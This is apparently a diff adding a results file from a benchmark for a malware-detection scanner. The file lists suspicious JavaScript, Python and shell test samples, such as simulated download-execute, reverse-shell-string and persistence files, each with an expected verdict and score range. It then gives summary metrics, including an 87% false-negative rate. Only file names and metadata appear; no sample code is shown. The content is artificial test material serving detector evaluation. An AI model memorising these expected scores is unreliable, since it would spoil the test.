+        "expectedScoreRange" : {
+          "max" : 74,
+          "min" : 55
+        },
+        "expectedVerdict" : "suspicious"
+      },
+      "group" : "suspicious",
+      "metadataPath" : "suspicious\/js\/suspicious_js_buffer_obfuscation_sim_02.js.json",
+      "relativePath" : "suspicious\/js\/suspicious_js_buffer_obfuscation_sim_02.js",
+      "sampleID" : "suspicious_js_buffer_obfuscation_sim_02",
+      "sourceKind" : "file",
+      "subtype" : "js"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/js\/suspicious_js_child_process_echo_chain_02.js",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 72,
+          "min" : 55
+        },
+        "expectedVerdict" : "suspicious"
+      },
+      "group" : "suspicious",
+      "metadataPath" : "suspicious\/js\/suspicious_js_child_process_echo_chain_02.js.json",
+      "relativePath" : "suspicious\/js\/suspicious_js_child_process_echo_chain_02.js",
+      "sampleID" : "suspicious_js_child_process_echo_chain_02",
+      "sourceKind" : "file",
+      "subtype" : "js"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/js\/suspicious_js_download_execute_sim_02.js",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 78,
+          "min" : 60
+        },
+        "expectedVerdict" : "suspicious"
+      },
+      "group" : "suspicious",
+      "metadataPath" : "suspicious\/js\/suspicious_js_download_execute_sim_02.js.json",
+      "relativePath" : "suspicious\/js\/suspicious_js_download_execute_sim_02.js",
+      "sampleID" : "suspicious_js_download_execute_sim_02",
+      "sourceKind" : "file",
+      "subtype" : "js"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/js\/suspicious_js_eval_decode_message_02.js",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 76,
+          "min" : 58
+        },
+        "expectedVerdict" : "suspicious"
+      },
+      "group" : "suspicious",
+      "metadataPath" : "suspicious\/js\/suspicious_js_eval_decode_message_02.js.json",
+      "relativePath" : "suspicious\/js\/suspicious_js_eval_decode_message_02.js",
+      "sampleID" : "suspicious_js_eval_decode_message_02",
+      "sourceKind" : "file",
+      "subtype" : "js"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/js\/suspicious_js_obfuscation_sim_01.js",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 80,
+          "min" : 60
+        },
+        "expectedVerdict" : "suspicious"
+      },
+      "group" : "suspicious",
+      "metadataPath" : "suspicious\/js\/suspicious_js_obfuscation_sim_01.js.meta.json",
+      "relativePath" : "suspicious\/js\/suspicious_js_obfuscation_sim_01.js",
+      "sampleID" : "suspicious_js_obfuscation_sim_01",
+      "sourceKind" : "file",
+      "subtype" : "js"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_download_would_execute_02.py",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 72,
+          "min" : 55
+        },
+        "expectedVerdict" : "suspicious"
+      },
+      "group" : "suspicious",
+      "metadataPath" : "suspicious\/python\/suspicious_python_download_would_execute_02.py.json",
+      "relativePath" : "suspicious\/python\/suspicious_python_download_would_execute_02.py",
+      "sampleID" : "suspicious_python_download_would_execute_02",
+      "sourceKind" : "file",
+      "subtype" : "python"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_downloader_sim_01.py",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 82,
+          "min" : 62
+        },
+        "expectedVerdict" : "suspicious"
+      },
+      "group" : "suspicious",
+      "metadataPath" : "suspicious\/python\/suspicious_python_downloader_sim_01.py.meta.json",
+      "relativePath" : "suspicious\/python\/suspicious_python_downloader_sim_01.py",
+      "sampleID" : "suspicious_python_downloader_sim_01",
+      "sourceKind" : "file",
+      "subtype" : "python"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_echo_chain_02.py",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 68,
+          "min" : 52
+        },
+        "expectedVerdict" : "suspicious"
+      },
+      "group" : "suspicious",
+      "metadataPath" : "suspicious\/python\/suspicious_python_echo_chain_02.py.json",
+      "relativePath" : "suspicious\/python\/suspicious_python_echo_chain_02.py",
+      "sampleID" : "suspicious_python_echo_chain_02",
+      "sourceKind" : "file",
+      "subtype" : "python"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_launchagent_mirror_02.py",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 68,
+          "min" : 52
+        },
+        "expectedVerdict" : "suspicious"
+      },
+      "group" : "suspicious",
+      "metadataPath" : "suspicious\/python\/suspicious_python_launchagent_mirror_02.py.json",
+      "relativePath" : "suspicious\/python\/suspicious_python_launchagent_mirror_02.py",
+      "sampleID" : "suspicious_python_launchagent_mirror_02",
+      "sourceKind" : "file",
+      "subtype" : "python"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_obfuscation_restore_02.py",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 76,
+          "min" : 58
+        },
+        "expectedVerdict" : "suspicious"
+      },
+      "group" : "suspicious",
+      "metadataPath" : "suspicious\/python\/suspicious_python_obfuscation_restore_02.py.json",
+      "relativePath" : "suspicious\/python\/suspicious_python_obfuscation_restore_02.py",
+      "sampleID" : "suspicious_python_obfuscation_restore_02",
+      "sourceKind" : "file",
+      "subtype" : "python"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_reverse_shell_string_02.py",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 78,
+          "min" : 60
+        },
+        "expectedVerdict" : "suspicious"
+      },
+      "group" : "suspicious",
+      "metadataPath" : "suspicious\/python\/suspicious_python_reverse_shell_string_02.py.json",
+      "relativePath" : "suspicious\/python\/suspicious_python_reverse_shell_string_02.py",
+      "sampleID" : "suspicious_python_reverse_shell_string_02",
+      "sourceKind" : "file",
+      "subtype" : "python"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_socket_metadata_sim_02.py",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 58,
+          "min" : 40
+        },
+        "expectedVerdict" : "suspicious"
+      },
+      "group" : "suspicious",
+      "metadataPath" : "suspicious\/python\/suspicious_python_socket_metadata_sim_02.py.json",
+      "relativePath" : "suspicious\/python\/suspicious_python_socket_metadata_sim_02.py",
+      "sampleID" : "suspicious_python_socket_metadata_sim_02",
+      "sourceKind" : "file",
+      "subtype" : "python"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_base64_decode_print_02.sh",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 72,
+          "min" : 55
+        },
+        "expectedVerdict" : "suspicious"
+      },
+      "group" : "suspicious",
+      "metadataPath" : "suspicious\/shell\/suspicious_shell_base64_decode_print_02.sh.json",
+      "relativePath" : "suspicious\/shell\/suspicious_shell_base64_decode_print_02.sh",
+      "sampleID" : "suspicious_shell_base64_decode_print_02",
+      "sourceKind" : "file",
+      "subtype" : "shell"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_download_exec_string_02.sh",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 75,
+          "min" : 60
+        },
+        "expectedVerdict" : "suspicious"
+      },
+      "group" : "suspicious",
+      "metadataPath" : "suspicious\/shell\/suspicious_shell_download_exec_string_02.sh.json",
+      "relativePath" : "suspicious\/shell\/suspicious_shell_download_exec_string_02.sh",
+      "sampleID" : "suspicious_shell_download_exec_string_02",
+      "sourceKind" : "file",
+      "subtype" : "shell"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_launchagent_mirror_02.sh",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 72,
+          "min" : 58
+        },
+        "expectedVerdict" : "suspicious"
+      },
+      "group" : "suspicious",
+      "metadataPath" : "suspicious\/shell\/suspicious_shell_launchagent_mirror_02.sh.json",
+      "relativePath" : "suspicious\/shell\/suspicious_shell_launchagent_mirror_02.sh",
+      "sampleID" : "suspicious_shell_launchagent_mirror_02",
+      "sourceKind" : "file",
+      "subtype" : "shell"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_mktemp_chain_sim_02.sh",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 78,
+          "min" : 60
+        },
+        "expectedVerdict" : "suspicious"
+      },
+      "group" : "suspicious",
+      "metadataPath" : "suspicious\/shell\/suspicious_shell_mktemp_chain_sim_02.sh.json",
+      "relativePath" : "suspicious\/shell\/suspicious_shell_mktemp_chain_sim_02.sh",
+      "sampleID" : "suspicious_shell_mktemp_chain_sim_02",
+      "sourceKind" : "file",
+      "subtype" : "shell"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_multistage_chain_note_02.sh",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 80,
+          "min" : 62
+        },
+        "expectedVerdict" : "suspicious"
+      },
+      "group" : "suspicious",
+      "metadataPath" : "suspicious\/shell\/suspicious_shell_multistage_chain_note_02.sh.json",
+      "relativePath" : "suspicious\/shell\/suspicious_shell_multistage_chain_note_02.sh",
+      "sampleID" : "suspicious_shell_multistage_chain_note_02",
+      "sourceKind" : "file",
+      "subtype" : "shell"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_persistence_sim_01.sh",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 80,
+          "min" : 60
+        },
+        "expectedVerdict" : "suspicious"
+      },
+      "group" : "suspicious",
+      "metadataPath" : "suspicious\/shell\/suspicious_shell_persistence_sim_01.sh.meta.json",
+      "relativePath" : "suspicious\/shell\/suspicious_shell_persistence_sim_01.sh",
+      "sampleID" : "suspicious_shell_persistence_sim_01",
+      "sourceKind" : "file",
+      "subtype" : "shell"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_profile_mirror_02.sh",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 68,
+          "min" : 50
+        },
+        "expectedVerdict" : "suspicious"
+      },
+      "group" : "suspicious",
+      "metadataPath" : "suspicious\/shell\/suspicious_shell_profile_mirror_02.sh.json",
+      "relativePath" : "suspicious\/shell\/suspicious_shell_profile_mirror_02.sh",
+      "sampleID" : "suspicious_shell_profile_mirror_02",
+      "sourceKind" : "file",
+      "subtype" : "shell"
+    }
+  ],
+  "schemaVersion" : "1.1",
+  "startedAt" : "2026-03-08T10:11:22Z",
+  "summary" : {
+    "analyzedSamples" : 73,
+    "averageScore" : 13.150684931506849,
+    "cleanCount" : 65,
+    "cleanFalsePositiveRate" : 0,
+    "confusionMatrix" : {
+      "clean" : {
+        "clean" : 40,
+        "suspicious" : 2,
+        "unknown" : 5
+      },
+      "malicious" : {
+        "clean" : 2,
+        "malicious" : 1,
+        "unknown" : 4
+      },
+      "suspicious" : {
+        "clean" : 23,
+        "malicious" : 1,
+        "suspicious" : 3,
+        "unknown" : 4
+      }
+    },
+    "failedSamples" : 12,
+    "falseNegativeCount" : 33,
+    "falseNegativeRate" : 0.868421052631579,
+    "falsePositiveCount" : 2,
+    "falsePositiveRate" : 0.0425531914893617,
+    "groupStats" : {
+      "clean" : {
+        "analyzed" : 21,
+        "avgScore" : 7.380952380952381,
+        "clean" : 21,
+        "failed" : 0,
+        "malicious" : 0,
+        "suspicious" : 0,
+        "total" : 21,
+        "unknown" : 0
+      },
+      "noisy_benign" : {
+        "analyzed" : 21,
+        "avgScore" : 12.142857142857142,
+        "clean" : 19,
+        "failed" : 0,
+        "malicious" : 0,
+        "suspicious" : 2,
+        "total" : 21,
+        "unknown" : 0
+      },
+      "replay_clean" : {
+        "analyzed" : 1,
+        "avgScore" : 0,
+        "clean" : 0,
+        "failed" : 4,
+        "malicious" : 0,
+        "suspicious" : 0,
+        "total" : 5,
+        "unknown" : 5
+      },
+      "replay_malicious" : {
+        "analyzed" : 1,
+        "avgScore" : 100,
+        "clean" : 0,
+        "failed" : 4,
+        "malicious" : 1,
+        "suspicious" : 0,
+        "total" : 5,
+        "unknown" : 4
+      },
+      "replay_suspicious" : {
+        "analyzed" : 1,
+        "avgScore" : 50,
+        "clean" : 0,
+        "failed" : 4,
+        "malicious" : 0,
+        "suspicious" : 1,
+        "total" : 5,
+        "unknown" : 4
+      },
+      "suspicious" : {
+        "analyzed" : 28,
+        "avgScore" : 14.285714285714286,
+        "clean" : 25,
+        "failed" : 0,
+        "malicious" : 1,
+        "suspicious" : 2,
+        "total" : 28,
+        "unknown" : 0
+      }
+    },
+    "isScoreMonotonic" : true,
+    "maliciousCount" : 2,
+    "medianScore" : 10,
+    "mismatchBreakdown" : {
+      "analysis_failed" : 12,
+      "score_too_high" : 4,
+      "score_too_low" : 18,
+      "verdict_too_high" : 3,
+      "verdict_too_low" : 26
+    },
+    "noisyBenignFalsePositiveRate" : 0.09523809523809523,
+    "replayMaliciousDetectionRate" : 1,
+    "scoreMonotonicityHints" : [
+
+    ],
+    "scoreRangeMatchRate" : 0.3287671232876712,
+    "suspiciousCount" : 5,
+    "suspiciousHitRate" : 0.10714285714285714,
+    "totalSamples" : 85,
+    "unknownCount" : 13,
+    "verdictAccuracy" : 0.5176470588235295
+  }
+}
